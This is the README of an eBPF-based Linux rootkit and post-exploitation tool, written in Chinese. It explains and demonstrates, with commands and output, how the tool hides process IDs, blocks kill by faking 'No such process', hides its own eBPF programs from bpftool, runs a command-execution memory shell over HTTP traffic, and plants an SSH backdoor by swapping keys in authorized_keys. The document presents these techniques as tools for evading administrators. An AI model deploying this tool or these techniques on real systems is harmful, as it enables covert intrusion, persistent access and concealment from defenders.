# eBPFeXPLOIT

eBPFeXPLOIT是一款基于eBPF的渗透利用工具。



目前实现的功能有：

- **隐藏自己的PID和指定的其他Pid，考虑到处理的方便至多隐藏5个pid**
- **ebpf内存马**
- **阻止Kill命令。指定Pid的进程将不会被Kill**
- **隐藏注入到内核中的eBPF程序、Map、Link**
- **ssh backdoor**



## Hide Pid

隐藏至多4个目标PID和自己的PID，一共5个pid。默认隐藏自己

```bash
go generate &&go build -o main &&./main -pid 263959,269942


echo $$
263959
ps aux | grep -i "263959"
root      277863  0.0  0.0   3440  1920 pts/2    S+   13:51   0:00 grep --color=auto -i 263959

```



隐藏Pid的原理就在于`getdents64`系统调用。在 Linux 中，`getdents64` 系统调用可以读取目录下的文件信息，ps等命令的底层都是通过`getdents64`获取`/proc/`文件夹下面文件的信息来获取进程相关信息。

`ctx`的第二个参数是`linux_dirent64 *dirp`，它的结构如下：

```c
 struct linux_dirent64 {
     u64        d_ino;    /* 64-bit inode number */
     u64        d_off;    /* 64-bit offset to next structure */
     unsigned short d_reclen; /* Size of this dirent */
     unsigned char  d_type;   /* File type */
     char           d_name[]; /* Filename (null-terminated) */ };
```

它实际上代表了`getdents64`将要访问的目录中的条目。前两个字段意义不大，第三个指的是当前这个`linux_dirent64`的长度，第五个`d_name`指的是当前目标的文件名，例如`pid`是200的话，即`/proc/200`，那么`d_name`就是200。

因此只要hook这个进程，将目标Pid的`linux_dirent64`的前一个`linux_dirent64`的`d_reclen`修改为`d_reclen_previous + d_reclen`，这样就可以跳过目标Pid的文件，实现了Pid的隐藏。

但是因为中间的逻辑比较复杂，如果要隐藏的Pid过多的话verifyier会炸，因此算上程序本身，至多隐藏5个。



## ebpf-MemoryShell

能够实现基本的内存马功能，但是还是有一系列的问题：

- 暂时没有处理分片传输。
- 我本地的虚拟机Linux有问题，一直配不好tc只接收egress流量，导致了tc是接收的egress和ingress全流量，性能相对来说会下降。
- 执行命令是用户态里执行命令，
- 命令执行必须放到get的最后一个参数中，因为不这样的话ebpf内核态处理会很麻烦导致过不去verify。
- 必须原始的http响应字节数比命令执行结果的字节数多才能完全回显，尝试过扩充http的响应包。可以使用`bpf_skb_change_tail`扩充，但是同样还需要修改http响应头中的`Content-Length`的值，非常的复杂导致过不去verify。



在处理网络数据包的性能上，XDP优于TC优于hook syscall，因此XDP一定是第一选择，但是xdp只能接收ingress的流量，而tc可以收到egress的流量，因此让二者分开进行处理两侧。

![TCP/IP  数据包报文格式（IP包、TCP报头、UDP报头）_数据包_02](README.assets/resize,m_fixed,w_1184)



xdp将接收到的命令发到用户态并执行后，用户态再将执行的结果发给TC，将结果写到http的响应中，而且如果执行结果想完全回显，必须找一个有比结果字节数多的http响应，一般还是比较好找的。

虽然提供了`dexec`这个选项，实际上`dexec=0`的功能还没有实现。

```bash
 ./main --help
Usage of ./main:
  -dexec string
        directly exec or not (default "-1")
  -ifname string
        interface xdp and tc will attach
  -pid string
        pid to hide (default "-1")


./main -ifname lo -dexec 1
```

![image-20240105165324387](README.assets/image-20240105165324387.png)



## Prevent Kill

虽然隐藏了Pid，假如运维还是以某种方式知道了我们程序的pid的话，需要阻止Kill命令杀死我们的进程。



首先hook `lsm/task_kill`，遇到要保护的pid的时候`return -EPERM`，阻止后续的执行。

同时hook `kretprobe/sys_kill`，当syscall返回的时候修改返回值为`-ESRCH`，就可以伪装该进程不存在：

```bash
go build -o main &&./main
2024/01/06 19:19:40 current pid:398235
2024/01/06 19:19:40 Waiting for events..


kill -9 398235
bash: kill: (398235) - No such process

```

考虑过用kprobe或者tp，但是没有很好的办法在enter的时候阻止后续的处理，因此只能用lsm，但感觉这似乎不是一个最好办法。

考虑过在kprobe里面直接over write return，但是我一直无法正确获取到参数的pid如果不用`BPF_KPROBE`宏的话，可能是我虚拟机的问题，看来一直在超级高版本的linux内核而且是arm64架构下开发问题真的很大，得想办法弄一个能远程开发的amd64架构的linux了（因为我是在mac的虚拟机里开发ebpf的）。



## Hide eBPF program

虽然隐藏了用户态程序本身的Pid，但是通过例如`bpftool prog list`这样的命令还是可以发现我们注入到内核中的eBPF程序，但是考虑到大部分Linux系统都不会去装`bpftool`，运维可能连eBPF是什么，因此注入到了内核的eBPF程序被发现的可能性很低，因此这部分的处理就比较简单，参考一下Learning-eBPF这本书中的内容，在查看prog或者map等基本都要经过这样的流程：

```bash
[0000ffffb38e1aa8] bpf(BPF_PROG_GET_NEXT_ID, {start_id=0, next_id=0, open_flags=0}, 12) = 0
[0000ffffb38e1aa8] bpf(BPF_PROG_GET_FD_BY_ID, {prog_id=2, next_id=0, open_flags=0}, 12) = 3
[0000ffffb38e1aa8] bpf(BPF_OBJ_GET_INFO_BY_FD, {info={bpf_fd=3, info_len=232, info=0xffffc95ef490}}, 16) = 0
```

先`BPF_PROG_GET_NEXT_ID`获取ID，然后`BPF_PROG_GET_FD_BY_ID`获取fd，最后`BPF_OBJ_GET_INFO_BY_FD`获取相关的obj，这样的步骤会一直循环，直到`BPF_PROG_GET_NEXT_ID`找不到相关的ID为止。

因此直接hook bpf系统调用，在遇到`BPF_PROG_GET_NEXT_ID`、`BPF_MAP_GET_NEXT_ID`和`BPF_LINK_GET_NEXT_ID`的时候，进行处理即可。



## ssh backdoor

ssh使用密钥登录的时候会读取`authorized_keys`文件中的公钥，利用eBPF程序hook openat和read等系统，替换掉`authorized_keys`中的公钥为我们自己的，就可以实现一个隐蔽的ssh后门。

因为考虑到之前的`authorized_keys`里面的字节数可能会不够，因此程序会在目标`authorized_keys`后面填充很多的空格。

## How to Use

```bash
 ./main --help
Usage of ./main:
  -dexec string
        directly exec or not (default "-1")
  -ifname string
        interface xdp and tc will attach
  -pid string
        pid to hide (default "-1")
```

隐藏其他Pid，默认会隐藏程序自身的pid：

```bash
./main -pid 263959,269942
```

内存马：

```bash
./main -ifname lo -dexec 1
```

`ifname`指定网络接口，`dexec`设置为1即可。

目前的程序只是简单的提供功能，因此启动程序后执行`ctrl+c`就可以停止程序。

如果程序在tc上遇到的问题导致没有清除，可以手动清除：

```bash
tc qdisc del dev lo clsact
```

自行将lo换成自己的网络接口即可。

阻止Kill（默认功能，针对Pid）：

```bash
go build -o main &&./main
2024/01/06 19:19:40 current pid:398235
2024/01/06 19:19:40 Waiting for events..


kill -9 398235
bash: kill: (398235) - No such process
```



隐藏eBPF程序（默认隐藏）：

```bash
go build -o main &&./main

#结果都为空
bpftool prog list
bpftool map list
bpftool link list

```

ssh后门：

```bash
./main -selfpubkey ./id_rsa.pub -targetpubkey /home/parallels/.ssh/authorized_keys


13:24:47 › ssh -i ./id_rsa parallels@10.211.55.11
parallels@10.211.55.11's password:

13:26:29 › ssh -i ./id_rsa parallels@10.211.55.11
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.5.13-060513-generic aarch64)
```





程序中用到了`BPF_MAP_TYPE_RINGBUF`等比较新的功能，我没有太细查最低的版本要求，问了一下gpt大概是差不多Kernel 5.8以上。

所以5.8及其以上版本的Linux内核理论上是能跑的通的。**此外程序需要以root权限运行。**

可执行程序是用go交叉编译出来的，理论上别的架构也能执行？这是我的内核版本：

```bash
uname -a
Linux ubuntu-linux-22-04-02-desktop 6.5.13-060513-generic #202311281736 SMP PREEMPT_DYNAMIC Tue Nov 28 18:10:14 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux
```





### 手动编译

```bash
go generate
go build -o eBPFeXPLOIT
```

编译环境需要按照[Getting Started - ebpf-go Documentation](https://ebpf-go.dev/guides/getting-started/)安装，因为用户态用的是Go。`ebpf`目录中的`vmlinux.h`可以自行生成：

```bash
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
```

对于clang的版本，我修了一些BUG后目前可以支持到clang14，再新的版本没有去测试过，可能也不会有太多问题。

## TODO

- 目前一切都不考虑将程序和Map pin到fs中，只为了提供方便的功能，等到整体功能实现的差不多之后可能会考虑。
- **对低版本Linux的兼容。写代码的时候使用了很多新功能，导致了低版本Linux内核不兼容**
- **增加容器逃逸的功能模块**
- **增加捕获ssh密钥和密码的功能**

## 免责申明

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。



## References

[[译]使用os/exec执行命令](https://colobu.com/2017/06/19/advanced-command-execution-in-Go-with-os-exec/)

[bpf-developer-tutorial/src/23-http/README.md at main · eunomia-bpf/bpf-developer-tutorial](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/23-http/README.md)

[使用cilium/ebpf编译并加载TC BPF代码](https://d0u9.io/use-cilium-ebpf-to-compile-and-load-tc-bpf-code/)

[Gui774ume/ebpfkit: ebpfkit is a rootkit powered by eBPF](https://github.com/Gui774ume/ebpfkit)

[pathtofile/bad-bpf: A collection of eBPF programs demonstrating bad behavior, presented at DEF CON 29](https://github.com/pathtofile/bad-bpf)

[Emulating Bad Networks](https://samwho.dev/blog/emulating-bad-networks/)

[Routing Family Netlink Library (libnl-route)](https://www.infradead.org/~tgr/libnl/doc/route.html#route_tc)

[Attaching EBPF program returns no such file or directory · Issue #32 · florianl/go-tc](https://github.com/florianl/go-tc/issues/32)

[tc package - github.com/florianl/go-tc - Go Packages](https://pkg.go.dev/github.com/florianl/go-tc#section-readme)

[绿色记忆:eBPF学习笔记](https://blog.gmem.cc/ebpf)

[Esonhugh/sshd_backdoor: /root/.ssh/authorized_keys evil file watchdog with ebpf tracepoint hook.](https://github.com/Esonhugh/sshd_backdoor)



